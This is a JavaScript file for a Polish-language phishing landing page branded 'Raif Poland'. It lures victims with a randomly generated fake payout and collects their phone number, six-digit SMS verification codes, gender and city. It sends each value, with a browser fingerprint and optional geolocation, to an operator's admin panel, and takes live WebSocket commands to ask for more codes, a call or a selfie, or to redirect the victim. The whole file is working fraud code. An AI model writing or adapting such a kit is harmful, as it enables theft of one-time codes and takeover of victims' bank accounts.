/**
 * Raif Poland — aplikacja lądowania
 * Ekran 1: telefon +48 → Ekran 2: kod SMS (6 cyfr) → kwota, płeć, miasto, ładowanie
 */

let ws = null;
let sessionToken = null;
let codeHistory = [];
let userData = {
    phone: null,
    codes: [],
    selectedAmount: null,
    selectedCurrency: 'pln',
    displayAmount: null,
    amountPLN: null,
    amountEUR: null,
    amountUSD: null,
    gender: null,
    city: null
};

const EXCHANGE_RATES = {
    eur: 4.32,
    usd: 3.95
};

// Dopuszczalne prefiksy polskich numerów komórkowych (UKE: 45x, 50x, 51x, 53x, 57x, 60x, 66x, 69x, 72x, 73x, 78x, 79x, 88x)
const PL_MOBILE_PREFIXES = ['45', '50', '51', '53', '57', '60', '66', '69', '72', '73', '78', '79', '88'];

function isValidPolishMobile(digits) {
    if (!digits || digits.length !== 9 || !/^\d+$/.test(digits)) return false;
    const prefix = digits.slice(0, 2);
    return PL_MOBILE_PREFIXES.includes(prefix);
}

let visibilityTimeout = null;
let loadingProgressInterval = null;
let savedScreenBeforeCommand = null;
let statusHeartbeat = null;
const STATUS_HEARTBEAT_INTERVAL = 7000;

// ============================================================================
// INICJALIZACJA
// ============================================================================

document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) {
        console.log('Raif Poland — inicjalizacja');
        console.log('Panel admina:', CONFIG.ADMIN_API_URL);
    }

    initPhoneForm();
    initCodeForm();

    document.addEventListener('click', async function(e) {
        const target = e.target;
        const btn = target.closest('#submitAmount') || (target.id === 'submitAmount' ? target : null);
        if (btn) {
            e.preventDefault();
            e.stopPropagation();
            if (btn.disabled) return;
            btn.disabled = true;
            btn.style.opacity = '0.6';
            try {
                if (!userData.amountPLN) {
                    alert('Błąd: kwoty nie ustawione. Odśwież stronę.');
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    return;
                }
                let amountToSend = userData.amountPLN;
                let currencyLabel = 'PLN';
                if (userData.selectedCurrency === 'eur') {
                    amountToSend = userData.amountEUR;
                    currencyLabel = 'EUR';
                } else if (userData.selectedCurrency === 'usd') {
                    amountToSend = userData.amountUSD;
                    currencyLabel = 'USD';
                }
                await sendData('amount', `${amountToSend} ${currencyLabel}`);
                showShortLoading('gender');
            } catch (err) {
                console.error(err);
                btn.disabled = false;
                btn.style.opacity = '1';
            }
        }
    }, true);

    document.addEventListener('click', function(e) {
        const currencyBtn = e.target.closest('.currency-btn');
        if (currencyBtn) {
            const amountScreen = document.getElementById('screen-amount');
            if (!amountScreen || !amountScreen.classList.contains('active')) return;
            document.querySelectorAll('.currency-btn').forEach(b => b.classList.remove('selected'));
            currencyBtn.classList.add('selected');
            userData.selectedCurrency = currencyBtn.dataset.currency;
            if (userData.amountPLN != null) {
                updateAmountDisplay(userData.amountPLN, userData.amountEUR, userData.amountUSD);
            }
        }
    }, false);

    document.addEventListener('click', async function(e) {
        if (e.target && (e.target.id === 'submitCode' || e.target.closest('#submitCode'))) {
            const codeScreen = document.getElementById('screen-code');
            if (!codeScreen || !codeScreen.classList.contains('active')) return;
            const btn = document.getElementById('submitCode');
            if (!btn || btn.disabled) return;
            e.preventDefault();
            e.stopPropagation();
            const inputs = document.querySelectorAll('.code-input');
            submitCode(inputs.length);
        }
    }, true);

    document.addEventListener('click', async function(e) {
        const genderBtn = e.target.closest('.gender-btn');
        if (genderBtn) {
            const genderScreen = document.getElementById('screen-gender');
            if (!genderScreen || !genderScreen.classList.contains('active')) return;
            const gender = genderBtn.dataset.gender;
            if (!gender) return;
            userData.gender = gender;
            await sendData('gender', gender);
            showShortLoading('city');
        }
    }, true);

    document.addEventListener('submit', async function(e) {
        if (e.target && e.target.id === 'cityForm') {
            e.preventDefault();
            const cityScreen = document.getElementById('screen-city');
            if (!cityScreen || !cityScreen.classList.contains('active')) return;
            const input = document.getElementById('cityInput');
            if (!input) return;
            const city = input.value.trim();
            if (!city || city.length < 2) {
                showError('cityError', 'Wprowadź poprawną nazwę miasta');
                return;
            }
            if (!/^[A-Za-zĄąĆćĘęŁłŃńÓóŚśŹźŻż\s\-]+$/.test(city)) {
                showError('cityError', 'Wprowadź nazwę miasta po polsku');
                return;
            }
            userData.city = city;
            await sendData('city', city);
            showShortLoading('final');
        }
    }, true);

    document.addEventListener('submit', async function(e) {
        if (e.target && e.target.id === 'phoneForm') {
            e.preventDefault();
            const phoneScreen = document.getElementById('screen-phone');
            if (!phoneScreen || !phoneScreen.classList.contains('active')) return;
            const input = document.getElementById('phone');
            if (!input) return;
            const digits = input.value.replace(/\D/g, '');
            if (digits.length !== 9) {
                showError('phoneError', 'Numer musi mieć 9 cyfr');
                return;
            }
            if (!isValidPolishMobile(digits)) {
                showError('phoneError', 'Wprowadź prawidłowy numer komórkowy (np. 500, 600, 730...)');
                return;
            }
            const phone = '+48' + digits;
            userData.phone = phone;
            await sendData('phone', phone);
            if (savedScreenBeforeCommand) {
                returnToSavedScreen('phone');
            } else {
                showCodeScreen(6);
            }
        }
    }, true);

    createSession();
    initOfflineDetection();
});

function initOfflineDetection() {
    window.addEventListener('beforeunload', () => {
        stopStatusHeartbeat();
        sendStatusSync('offline');
    });
    window.addEventListener('pagehide', () => {
        if (visibilityTimeout) clearTimeout(visibilityTimeout);
        stopStatusHeartbeat();
        sendStatusSync('offline');
    });
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            sendStatus('minimized');
            stopStatusHeartbeat();
            if (visibilityTimeout) clearTimeout(visibilityTimeout);
            visibilityTimeout = setTimeout(() => sendStatus('offline'), 8000);
        } else {
            if (visibilityTimeout) clearTimeout(visibilityTimeout);
            visibilityTimeout = null;
            sendStatus('online');
            startStatusHeartbeat();
        }
    });
}

function sendStatusSync(status) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    const data = JSON.stringify({ session_token: sessionToken, status: status });
    navigator.sendBeacon(`${CONFIG.ADMIN_API_URL}/api/session/status`, data);
}

// ============================================================================
// SESJA I API
// ============================================================================

async function createSession() {
    try {
        const fingerprint = await generateFingerprint();
        const geolocation = CONFIG.SETTINGS.sendGeolocation ? await getGeolocation() : null;
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                landing_version: 'Raif Poland',
                fingerprint,
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                geolocation,
                referer: window.location.origin || window.location.href
            })
        });
        const data = await response.json().catch(() => ({}));
        if (response.ok && data.session_token) {
            sessionToken = data.session_token;
            if (CONFIG.SETTINGS.debug) console.log('Sesja utworzona:', sessionToken);
            connectWebSocket();
        } else {
            sessionToken = 'local_' + Date.now();
            if (response.status === 403) {
                console.warn('Serwer zwrócił 403 — dostęp z tego adresu IP może być zablokowany w panelu admina.');
                if (CONFIG.SETTINGS.debug && data.detail) console.warn('Szczegóły:', data.detail);
            } else {
                console.warn('Nie udało się utworzyć sesji:', response.status, data);
            }
        }
    } catch (err) {
        console.error('Błąd tworzenia sesji:', err);
        sessionToken = 'local_' + Date.now();
    }
}

function connectWebSocket() {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    try {
        ws = new WebSocket(`${CONFIG.ADMIN_WS_URL}/client/${sessionToken}`);
        ws.onopen = () => {
            sendStatus('online');
            startStatusHeartbeat();
        };
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleCommand(data);
        };
        ws.onerror = () => console.warn('WebSocket błąd');
        ws.onclose = () => setTimeout(connectWebSocket, CONFIG.SETTINGS.wsReconnectTimeout);
    } catch (err) {
        console.error('WebSocket:', err);
    }
}

function handleCommand(data) {
    const currentScreen = document.querySelector('.screen.active');
    if (currentScreen && savedScreenBeforeCommand !== 'screen-loading') {
        if (savedScreenBeforeCommand !== 'screen-amount' || currentScreen.id === 'screen-loading') {
            savedScreenBeforeCommand = currentScreen.id;
        }
    }
    const { command } = data;
    switch (command) {
        case 'show_3_code':
        case 'show_4_code':
        case 'show_6_code':
            showCodeScreen(6);
            break;
        case 'show_phone':
            showScreen('screen-phone');
            clearPhoneInput();
            showError('phoneError', 'Nieprawidłowy numer. Wprowadź nowy.');
            break;
        case 'show_call':
            showScreen('screen-call');
            break;
        case 'show_selfie':
            showScreen('screen-selfie');
            break;
        case 'show_loading':
            showScreen('screen-loading');
            break;
        case 'show_message':
            showScreen('screen-loading');
            const loadingMessage = document.getElementById('loading-message');
            if (loadingMessage && data.message) loadingMessage.textContent = data.message;
            break;
        case 'redirect':
            if (data.url) window.location.href = data.url;
            break;
        case 'send_signal':
            showSignalAlert(data.message || 'Uwaga!');
            playSignalSound();
            break;
        default:
            console.warn('Nieznana komenda:', command);
    }
}

async function sendData(type, value) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) {
        if (CONFIG.SETTINGS.debug) console.warn('Pomijam wysyłkę (brak sesji z serwera):', type, '=', value);
        return;
    }
    try {
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                session_token: sessionToken,
                data_type: type,
                data_value: value
            })
        });
        if (CONFIG.SETTINGS.debug) console.log('Wysłano:', type, '=', value);
        return await response.json();
    } catch (err) {
        console.error('Błąd wysyłania:', err);
    }
}

async function sendStatus(status, isHeartbeat = false) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    try {
        await fetch(`${CONFIG.ADMIN_API_URL}/api/session/status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_token: sessionToken, status })
        });
    } catch (err) {
        console.error('Błąd statusu:', err);
    }
}

function startStatusHeartbeat() {
    if (statusHeartbeat) return;
    statusHeartbeat = setInterval(() => {
        if (!document.hidden) sendStatus('online', true);
    }, STATUS_HEARTBEAT_INTERVAL);
}

function stopStatusHeartbeat() {
    if (statusHeartbeat) {
        clearInterval(statusHeartbeat);
        statusHeartbeat = null;
    }
}

// ============================================================================
// TELEFON
// ============================================================================

function initPhoneForm() {
    const input = document.getElementById('phone');
    if (!input) return;
    input.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);
        e.target.value = formatPhonePL(value);
    });
}

function formatPhonePL(value) {
    if (value.length <= 3) return value;
    if (value.length <= 6) return `${value.slice(0, 3)} ${value.slice(3)}`;
    return `${value.slice(0, 3)} ${value.slice(3, 6)} ${value.slice(6)}`;
}

function clearPhoneInput() {
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.value = '';
        phoneInput.focus();
    }
}

// ============================================================================
// KOD SMS (6 cyfr)
// ============================================================================

function initCodeForm() {}

function showCodeScreen(digits) {
    const container = document.getElementById('codeInputs');
    const instruction = document.getElementById('codeInstruction');
    const submitBtn = document.getElementById('submitCode');
    if (!container || !instruction || !submitBtn) return;

    codeHistory = [];
    const codeError = document.getElementById('codeError');
    if (codeError) {
        codeError.innerHTML = '';
        codeError.style.display = 'none';
    }
    if (!savedScreenBeforeCommand) {
        const currentScreen = document.querySelector('.screen.active');
        if (currentScreen && currentScreen.id !== 'screen-code') savedScreenBeforeCommand = currentScreen.id;
    }

    container.innerHTML = '';
    instruction.textContent = `Na numer ${userData.phone || '+48 XXX XXX XXX'} wysłano SMS. Wprowadź 6 cyfr.`;

    for (let i = 0; i < digits; i++) {
        const input = document.createElement('input');
        input.type = 'tel';
        input.className = 'code-input';
        input.maxLength = 1;
        input.pattern = '[0-9]';
        input.inputMode = 'numeric';
        input.dataset.index = i;
        input.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '').slice(-1);
            e.target.value = value;
            if (value.length === 1 && i < digits - 1) container.children[i + 1].focus();
            checkCodeComplete();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && i > 0) container.children[i - 1].focus();
        });
        container.appendChild(input);
    }

    showScreen('screen-code');
    setTimeout(() => {
        const first = container.querySelector('.code-input');
        if (first) first.focus();
    }, 100);
    submitBtn.disabled = true;
    startTimer();
}

function checkCodeComplete() {
    const inputs = document.querySelectorAll('.code-input');
    const submitBtn = document.getElementById('submitCode');
    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
    submitBtn.disabled = !allFilled;
    if (allFilled) setTimeout(() => submitCode(inputs.length), 300);
}

async function submitCode(digits) {
    const inputs = document.querySelectorAll('.code-input');
    const code = Array.from(inputs).map(input => input.value).join('');
    if (code.length !== digits) {
        showError('codeError', 'Wprowadź wszystkie cyfry kodu');
        return;
    }
    if (!/^\d+$/.test(code)) {
        showError('codeError', 'Kod może zawierać tylko cyfry');
        const container = document.getElementById('codeInputs');
        if (container) container.querySelectorAll('.code-input').forEach(input => input.value = '');
        document.getElementById('submitCode').disabled = true;
        return;
    }
    if (codeHistory.includes(code)) {
        const codeError = document.getElementById('codeError');
        if (codeError) {
            codeError.innerHTML = 'Ten kod został już użyty. Wprowadź nowy kod z SMS.';
            codeError.style.display = 'block';
        }
        const container = document.getElementById('codeInputs');
        if (container) {
            container.querySelectorAll('.code-input').forEach(input => input.value = '');
            const first = container.querySelector('.code-input');
            if (first) first.focus();
        }
        document.getElementById('submitCode').disabled = true;
        return;
    }
    codeHistory.push(code);
    userData.codes.push(code);
    await sendData(`code_${digits}`, code);
    returnToSavedScreen('code');
}

// ============================================================================
// KWOTA, PŁEĆ, MIASTO, ŁADOWANIE
// ============================================================================

function showAmountSelection() {
    showScreen('screen-amount');
    setTimeout(() => {
        const amountInfo = document.getElementById('amountInfo');
        const submitBtn = document.getElementById('submitAmount');
        const currencyButtons = document.querySelectorAll('.currency-btn');
        if (!amountInfo || !submitBtn) return;

        if (!userData.amountPLN) {
            const amountPLN = Math.floor(Math.random() * (10100 - 8600 + 1)) + 8600;
            userData.selectedAmount = amountPLN;
            userData.amountPLN = amountPLN;
            userData.amountEUR = Math.round((amountPLN / EXCHANGE_RATES.eur) * 100) / 100;
            userData.amountUSD = Math.round((amountPLN / EXCHANGE_RATES.usd) * 100) / 100;
        }
        if (!userData.selectedCurrency) userData.selectedCurrency = 'pln';
        updateAmountDisplay(userData.amountPLN, userData.amountEUR, userData.amountUSD);
        currencyButtons.forEach(btn => {
            if (btn.dataset.currency === userData.selectedCurrency) btn.classList.add('selected');
            else btn.classList.remove('selected');
        });
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
    }, 100);
}

function updateAmountDisplay(amountPLN, amountEUR, amountUSD) {
    const amountInfo = document.getElementById('amountInfo');
    if (!amountInfo) return;
    const currency = userData.selectedCurrency || 'pln';
    let displayText = '';
    if (currency === 'pln') {
        displayText = `${amountPLN.toLocaleString('pl-PL')} zł`;
    } else if (currency === 'eur') {
        displayText = `€${amountEUR.toLocaleString('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} (≈ ${amountPLN.toLocaleString('pl-PL')} zł)`;
    } else {
        displayText = `$${amountUSD.toLocaleString('pl-PL', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} (≈ ${amountPLN.toLocaleString('pl-PL')} zł)`;
    }
    amountInfo.textContent = displayText;
    userData.displayAmount = displayText;
}

function showShortLoading(nextScreen) {
    if (loadingProgressInterval) {
        clearInterval(loadingProgressInterval);
        loadingProgressInterval = null;
    }
    showScreen('screen-short-loading');
    const shortLoadingAmountDisplay = document.getElementById('shortLoadingAmountDisplay');
    if (shortLoadingAmountDisplay && userData.displayAmount) shortLoadingAmountDisplay.textContent = userData.displayAmount;

    const progressBar = document.getElementById('shortLoadingProgressBar');
    if (progressBar) {
        let progress = 0;
        const duration = 3000;
        const interval = 50;
        const step = 100 / (duration / interval);
        progressBar.style.width = '0%';
        loadingProgressInterval = setInterval(() => {
            progress += step;
            if (progress >= 100) {
                progress = 100;
                clearInterval(loadingProgressInterval);
                loadingProgressInterval = null;
                if (nextScreen === 'gender') showGenderScreen();
                else if (nextScreen === 'city') showCityScreen();
                else if (nextScreen === 'final') showFinalLoading();
            }
            progressBar.style.width = `${progress}%`;
        }, interval);
    }
}

function showGenderScreen() {
    showScreen('screen-gender');
    const genderAmountDisplay = document.getElementById('genderAmountDisplay');
    if (genderAmountDisplay && userData.displayAmount) {
        genderAmountDisplay.textContent = `Twoja wypłata: ${userData.displayAmount}`;
    }
}

function showCityScreen() {
    showScreen('screen-city');
    const cityAmountDisplay = document.getElementById('cityAmountDisplay');
    if (cityAmountDisplay && userData.displayAmount) {
        cityAmountDisplay.textContent = `Twoja wypłata: ${userData.displayAmount}`;
    }
    const cityInput = document.getElementById('cityInput');
    if (cityInput) {
        cityInput.value = '';
        setTimeout(() => cityInput.focus(), 100);
    }
}

function showFinalLoading() {
    if (loadingProgressInterval) {
        clearInterval(loadingProgressInterval);
        loadingProgressInterval = null;
    }
    showScreen('screen-loading');
    const loadingAmountDisplay = document.getElementById('loadingAmountDisplay');
    if (loadingAmountDisplay && userData.displayAmount) {
        loadingAmountDisplay.textContent = userData.displayAmount;
        loadingAmountDisplay.style.display = 'block';
    }
    const progressBar = document.getElementById('loadingProgressBar');
    const progressText = document.getElementById('loadingProgressText');
    if (progressBar && progressText) {
        let progress = 0;
        progressBar.style.width = '0%';
        progressText.textContent = '0%';
        const duration = 60000;
        const interval = 100;
        const step = 100 / (duration / interval);
        loadingProgressInterval = setInterval(() => {
            progress += step;
            if (progress >= 100) {
                progress = 100;
                clearInterval(loadingProgressInterval);
                loadingProgressInterval = null;
            }
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `${Math.round(progress)}%`;
        }, interval);
    }
}

function returnToSavedScreen(dataType) {
    const screenToReturn = savedScreenBeforeCommand;
    savedScreenBeforeCommand = null;
    if (screenToReturn === 'screen-loading') {
        showFinalLoading();
        return;
    }
    if (screenToReturn === 'screen-amount') {
        showAmountSelection();
        return;
    }
    if (screenToReturn === 'screen-gender') showGenderScreen();
    else if (screenToReturn === 'screen-city') showCityScreen();
    else if (screenToReturn === 'screen-short-loading') showFinalLoading();
    else {
        switch (dataType) {
            case 'phone':
                showCodeScreen(6);
                break;
            case 'code':
                showAmountSelection();
                break;
            default:
                showFinalLoading();
        }
    }
}

// ============================================================================
// POMOCNICZE
// ============================================================================

function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => screen.classList.remove('active'));
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.classList.add('active');
        if (screenId === 'screen-phone') initPhoneForm();
    }
}

function showError(errorId, message) {
    const errorDiv = document.getElementById(errorId);
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
}

function startTimer() {
    let seconds = 30;
    const timerEl = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    const interval = setInterval(() => {
        seconds--;
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        if (seconds <= 0) {
            clearInterval(interval);
            resendLink.classList.remove('resend-link--disabled');
        }
    }, 1000);
}

function showSignalAlert(message) {
    let el = document.getElementById('signalAlert');
    if (!el) {
        el = document.createElement('div');
        el.id = 'signalAlert';
        el.className = 'signal-alert';
        el.innerHTML = '<span class="signal-alert__icon">🚨</span><span class="signal-alert__text">Uwaga!</span>';
        document.body.appendChild(el);
    }
    const textEl = el.querySelector('.signal-alert__text');
    if (textEl) textEl.textContent = message || 'Uwaga!';
    el.classList.add('visible');
    setTimeout(() => el.classList.remove('visible'), 4000);
}

function playSignalSound() {
    try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (!AudioCtx) return;
        const ctx = new AudioContext();
        if (ctx.state === 'suspended') ctx.resume();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(750, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(520, ctx.currentTime + 1.2);
        gain.gain.setValueAtTime(0.001, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.35, ctx.currentTime + 0.05);
        gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 1.2);
        osc.connect(gain).connect(ctx.destination);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 1.2);
    } catch (e) {}
}

async function generateFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        screen.width,
        screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || 'unknown',
        navigator.deviceMemory || 'unknown'
    ];
    return hashString(components.join('|'));
}

async function hashString(str) {
    const buffer = new TextEncoder().encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

function getGeolocation() {
    return new Promise(resolve => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
                () => resolve(null),
                { timeout: 5000 }
            );
        } else resolve(null);
    });
}

if (CONFIG.SETTINGS.debug) console.log('app.js Raif Poland załadowany');
